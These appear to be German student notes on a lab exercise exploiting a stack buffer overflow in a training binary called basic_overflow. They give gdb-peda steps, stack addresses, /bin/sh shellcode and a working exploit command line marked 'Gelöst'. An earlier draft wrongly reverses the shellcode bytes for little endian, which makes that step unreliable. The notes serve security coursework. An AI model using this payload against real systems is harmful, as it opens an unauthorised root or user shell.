Zu Aufg.2:

gdb basic_overflow
start
disass
break *0xAddrInHex
run <parameter>
next
print $ebp

String muss gesamt 113 Zeichen haben:
zB: 11111111112222222222333333333344444444445555555555666666666677777777778888888888999999999900000000001111111111222

gdb-peda$ run `perl -e 'print "A"x112 ."BBBB"."CCCCDDDD"'`

As lassen
Bs = Adresse des Shellcodes
CsDs = Shellcode 

Shellcode:
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
Umgedreht wegen Little Endian:
\x80\xcd\x0b\xb0\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x51\xe1\xf7\xc9\x31

EBP Adressen in denen AAAA steht:
Addr	
0xBFFFEF74
0xBFFFEF8C
0xBFFFEFF8
0xBFFFF295

Idee:
92 NOPs + 21 Byte Shellcode = 113 Byte Offset, dann die kleinste der Adressen (um NOPSled zu treffen) auch little Endian
gdb-peda$ run `perl -e 'print "\x90"x92 ."\x80\xcd\x0b\xb0\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x51\xe1\xf7\xc9\x31"."\x74\xEF\xFF\xBF"'`
Hab ich noch nicht wirklich ausprobiert..
Vllt muss auch eins iwas nicht LittleEndian sein, oder die Adresse ist falsch ... oder das geht so nicht


Gelöst:
/home/user/aufgabe2/basic_overflow `perl -e 'print "\x90"x79 ."\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"."A"x12 ."\xcb\xef\xff\xbf"'`